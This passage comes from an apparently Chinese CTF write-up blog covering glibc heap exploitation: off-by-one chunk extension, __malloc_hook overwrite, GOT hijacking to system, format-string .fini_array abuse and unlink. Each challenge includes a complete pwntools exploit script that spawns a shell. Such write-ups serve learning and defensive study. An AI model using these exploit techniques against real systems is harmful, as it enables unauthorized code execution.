class="string">b&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#3 阻断top chunk</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\xe1&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">leak=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">libc_base=leak-(<span class="number">0x3c4b78</span>)</span><br><span class="line"></span><br><span class="line">realloc_addr=libc_base+libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fake_chunk_addr=malloc_hook-<span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4527a</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(realloc_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(fake_chunk_addr))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x08</span>)<span class="comment"># 4与2同时指向0x70</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(fake_chunk_addr)+<span class="string">b&#x27;\n&#x27;</span>)<span class="comment">#换行依然很重要</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x08</span>)<span class="comment">#4</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x13</span>-<span class="number">0x08</span>)+p64(one_gadget)+p64(realloc_addr+<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0x68</span>,payload)<span class="comment">#5</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">r.send(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">b&quot;size?&quot;</span>,<span class="built_in">str</span>(<span class="number">0x18</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行有小几率会发生段错误，并且gdb无法获取符号表，不知道为什么[<u>无法获取符号表已解决见小记0x6</u>]</p><p>有几处一定要加换行符,大概是因为程序中的edit函数中的read是一个字节一个字节读入的,故空字符会使得read等待输入,而不是继续往下执行直到退出,故需要换行符来触发退出.</p><p><strong>小记0x4</strong></p><h2 id="HITCON-Trainging-lab13-heapcreator"><a href="#HITCON-Trainging-lab13-heapcreator" class="headerlink" title="HITCON Trainging lab13 heapcreator"></a>HITCON Trainging lab13 heapcreator</h2><p><strong>难度:★</strong></p><p>核心利用依然是off-by-one，且off-by-one大概率和chunk-extend利用有关</p><p>这次可以利用off-by-one漏洞达到任意写任意读的目的</p><p>读哪里写哪里是一个关键</p><p>因为程序没有开启pie,所以可以直接得到某个函数的got表地址,此外,got表可修改</p><p>比较方便的利用是修改free的got表</p><p>然后先读出free真实地址以此得到libc基址</p><p>然后再修改free为system函数</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,25919)#这道题在buuctf也能找到</span></span><br><span class="line">p=process(<span class="string">&#x27;./hc&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./hc&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(size)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(content)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(idx)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(content)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(idx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(idx)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">create(<span class="string">b&#x27;24&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;16&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="string">b&#x27;0&#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+<span class="string">b&#x27;\x41&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#free后，原先的contentchunk和头chunk被挂入fastbin，且由于大小合适contentchunk会被取出作为新的头chunk，这样新的头chunk和contentchunk的位置就对调了，从而可写content指针</span></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">100</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">create(<span class="string">b&#x27;48&#x27;</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content : &#x27;</span>)</span><br><span class="line">free_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(free_addr))</span><br><span class="line">base=free_addr-libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">system_addr=base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>,p64(system_addr))</span><br><span class="line">p.send(<span class="string">b&#x27;4&#x27;</span>)   <span class="comment">#这里不用delete函数是因为跳转到执行system后,就接收不到数据了,recv会堵塞卡住</span></span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这题唯一需要注意的就是<strong>确定free-got表这个利用点</strong>,因为free的参数是一个可写指针,这样再修改为system函数,参数就可控了</p><p>而恰好这道题没有pie且got表可写,free-got表是最快捷的突破点,至于修改hook什么的也能做到不过要多花一些功夫</p><h2 id="2015-hacklu-bookstore"><a href="#2015-hacklu-bookstore" class="headerlink" title="2015 hacklu bookstore"></a>2015 hacklu bookstore</h2><p><strong>难度:★★★</strong></p><p>难度不小，非常综合的一题，要用到不少知识</p><p>程序没有开relro和pie</p><p>程序比较易发现的漏洞有</p><ol><li>无限读，程序在读取内容时是仅以出现换行符来判断结束的</li><li>程序在free后没有设置NULL，故存在UAF</li><li>程序结尾存在一个格式字符串漏洞</li></ol><p>写的能力全部在格式化字符串上</p><p>核心关键点在于修改了book2的size后在释放,使得submit获得的chunk就为book2,从而使的dest被overlap以达到控制格式化字符串的目的</p><p>其中book1的内容的控制也算十分精妙</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">我们需要让printf堆块处执行格式化的漏洞，就需要让submit功能去帮助我们覆盖，submit功能会加上order1:等这些字符串，不能漏掉，总结后可以得知新申请的堆块内容为：</span><br><span class="line"></span><br><span class="line">Order 1: + chunk1 + \n + Order 2: + chunk2 + \n</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">因为chunk2已经被delete掉了，所以当复制chunk2中的内容的时候复制的其实是order 1: + chunk1。所以上述可以变为：</span><br><span class="line"></span><br><span class="line">Order 1: + chunk1 + \n + Order 2: + Order 1: + chunk1 + \n</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">所以我们可以构造第二次的chunk1内容恰好覆盖到dest堆块处。也就是：</span><br><span class="line"></span><br><span class="line">size(Order 1: + chunk1 + \n + Order 2: + Order 1:) == 0x90</span><br><span class="line"></span><br><span class="line">size(chunk1) == 0x90 - 28 == 0x74</span><br></pre></td></tr></table></figure><p>然而单单一次格式化字符串显然并不能达到目的</p><p>故而又要想方设法做到二次利用</p><p>最好的方法自然是.fini_array的利用</p><p>且这道题.fini_array的返回地址恰好与一个onegadget相近,剩下的就都是常规套路了</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p = process(<span class="string">&#x27;./books&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./books&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit1</span>(<span class="params">content</span>) :</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Enter first order:\n&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit2</span>(<span class="params">content</span>) :</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Enter second order:\n&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete2</span>() :</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fini_array = <span class="number">0x6011B8</span></span><br><span class="line">main_addr = <span class="number">0x400A39</span></span><br><span class="line"> </span><br><span class="line">delete2()</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&quot;%2617c%13$hn.%31$p,%28$p&quot;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x74</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload += p8(<span class="number">0x0</span>)*(<span class="number">0x88</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload += p64(<span class="number">0x151</span>)</span><br><span class="line">edit1(payload)</span><br><span class="line"> </span><br><span class="line">payload2 = <span class="string">b&#x27;5&#x27;</span>+p8(<span class="number">0x0</span>)*<span class="number">7</span> + p64(fini_array)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="comment">#leak --&gt; libc_base</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x2e&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x2e&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x2e&#x27;</span>)</span><br><span class="line">data = p.recv(<span class="number">14</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;,&#x27;</span>)</span><br><span class="line">ret_addr = p.recv(<span class="number">14</span>)</span><br><span class="line">data = <span class="built_in">int</span>(data,<span class="number">16</span>) - <span class="number">240</span></span><br><span class="line">ret_addr = <span class="built_in">int</span>(ret_addr,<span class="number">16</span>) + <span class="number">0x28</span> - <span class="number">0x210</span></span><br><span class="line">libc_base = data - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;ret_addr :&#x27;</span>+<span class="built_in">hex</span>(ret_addr))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#repeat --&gt; change ret_addr --&gt; system_addr(one_gadget)</span></span><br><span class="line">one_shot = libc_base + <span class="number">0x45226</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(one_shot))</span><br><span class="line">one_shot1 = <span class="string">&#x27;0x&#x27;</span>+<span class="built_in">hex</span>(one_shot)[-<span class="number">2</span>:]</span><br><span class="line">one_shot2 = <span class="string">&#x27;0x&#x27;</span>+<span class="built_in">hex</span>(one_shot)[-<span class="number">6</span>:-<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span> (one_shot1,one_shot2)</span><br><span class="line">one_shot1 = <span class="built_in">int</span>(one_shot1,<span class="number">16</span>)</span><br><span class="line">one_shot2 = <span class="built_in">int</span>(one_shot2,<span class="number">16</span>)</span><br><span class="line"> </span><br><span class="line">delete2()</span><br><span class="line"> </span><br><span class="line">payload3 = <span class="built_in">bytes</span>(<span class="string">&#x27;%&#123;&#125;d%13$hhn&#x27;</span>.<span class="built_in">format</span>(one_shot1),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">payload3 += <span class="built_in">bytes</span>(<span class="string">&#x27;%&#123;&#125;d%14$hn&#x27;</span>.<span class="built_in">format</span>(one_shot2-one_shot1),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">payload3 += <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x74</span>-<span class="built_in">len</span>(payload3))</span><br><span class="line">payload3 += p8(<span class="number">0x0</span>)*(<span class="number">0x88</span>-<span class="built_in">len</span>(payload3))</span><br><span class="line">payload3 += p64(<span class="number">0x151</span>)</span><br><span class="line">edit1(payload3)</span><br><span class="line"> </span><br><span class="line">payload4 = <span class="string">b&#x27;5&#x27;</span> + p8(<span class="number">0x0</span>)*<span class="number">7</span> + p64(ret_addr) + p64(ret_addr+<span class="number">1</span>)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>小记0x5-0x6</strong></p><h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h2><p><strong>难度:★★</strong></p><p>非常经典的unlink题目</p><p>其最大的利用点是其edit功能无大小限制,可以读取任意大小数据,依此可以做到覆盖下一个chunk的prev_size和size,从而达到unlink的功能</p><p><strong>注意点1:</strong>这题的第一次o操作是在第一个chunk申请后,也就是说第一个我们申请的chunk的后面会是一个stdout的缓冲区,是我们无法利用的,因此需一个chunk引出ochunk,之后正常利用</p><p><strong>注意点2:</strong>这题没有任何能够输出有效信息的功能,故而一切有效利用信息,都需要通过基于unlink实现的改写got表,通过puts函数泄露信息,最后wiki选择的是修改atoi函数为system,但我选择的再次修改free_got,另外wiki的exp最后好像有一点问题..</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line">head=<span class="number">0x602140</span>  <span class="comment">#but the first not use so....</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">idx,length,content</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">p.send(content)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)   <span class="comment">#ensure chunksize &gt;MAX_fastbin(0x80)</span></span><br><span class="line"><span class="comment">#alloc(0x20)</span></span><br><span class="line"></span><br><span class="line">payload1=p64(<span class="number">0</span>)+p64(<span class="number">0x20</span>)+p64(head-<span class="number">0x8</span>)+p64(head)+p64(<span class="number">0x20</span>)<span class="comment">#fake chunk and unlink trigger</span></span><br><span class="line">payload1=payload1.ljust(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>)  <span class="comment">#pudding</span></span><br><span class="line">payload1+=p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)  <span class="comment">#edit prev_inuse bit</span></span><br><span class="line"></span><br><span class="line">read(<span class="number">2</span>,<span class="built_in">len</span>(payload1),payload1)</span><br><span class="line">free(<span class="number">3</span>)   <span class="comment">#trigger unlink</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(e.got[<span class="string">&#x27;free&#x27;</span>])+p64(e.got[<span class="string">&#x27;puts&#x27;</span>])+p64(e.got[<span class="string">&#x27;free&#x27;</span>])<span class="comment">#depoloy 0,1,2</span></span><br><span class="line"></span><br><span class="line">read(<span class="number">2</span>,<span class="built_in">len</span>(payload2),payload2)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>,<span class="number">8</span>,p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]))  <span class="comment">#free -&gt;puts</span></span><br><span class="line">free(<span class="number">1</span>)  <span class="comment">##puts(plt_addr)</span></span><br><span class="line">puts_got=p.recvuntil(<span class="string">&#x27;\nOK\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">puts_got=u64(puts_got)</span><br><span class="line">log.success(<span class="string">&#x27;puts_plt:&#x27;</span>+<span class="built_in">hex</span>(puts_got))</span><br><span class="line">libc_base=puts_got-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">read(<span class="number">2</span>,<span class="number">8</span>,p64(system))<span class="comment">#free -&gt; puts -&gt; system</span></span><br><span class="line">alloc(<span class="number">0x20</span>)</span><br><span class="line">read(<span class="number">4</span>,<span class="number">8</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)<span class="comment">#system(&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这题chunk靠不靠近top_chunk不是很重要影响不大</p><p>另外特别要注意一点是:<strong>chunk3的大小要超过fastbin的最大大小</strong>,不然的话释放chunk3<u>直接进入fastbin</u>就不会触发unlink了</p><p><strong>最后提一下gdb的显示问题,gdb会从堆的开始判断chunk的个数,以这题为例,unlink后chunk2和chunk3依然存在,这是因为gdb先判断的chunk2,这样就把我们伪造的chunk的头给包含进chunk2了,于是unlink后的chunk就没有被gdb识别,反而chunk3继续存在</strong></p><h2 id="2014HITCON-note2"><a href="#2014HITCON-note2" class="headerlink" title="2014HITCON note2"></a>2014HITCON note2</h2><p><strong>难度:★★</strong></p><p>和上一题几乎一个套路,也是标准的unlink题</p><p>防护pie没开,以及got表可写</p><p>关键的利用点在于一个整数溢出点,是的可以达到无限读的目的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_4009BD</span><span class="params">(__int64 a1, __int64 a2, <span class="type">char</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; a2 - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a1) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(a1 + i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>i是无符号整型,a2是有符号数,如果a2等于0,那么a2-1就是-1就会被视为一个极大的无符号数</p><p>其它和上一题一个套路</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 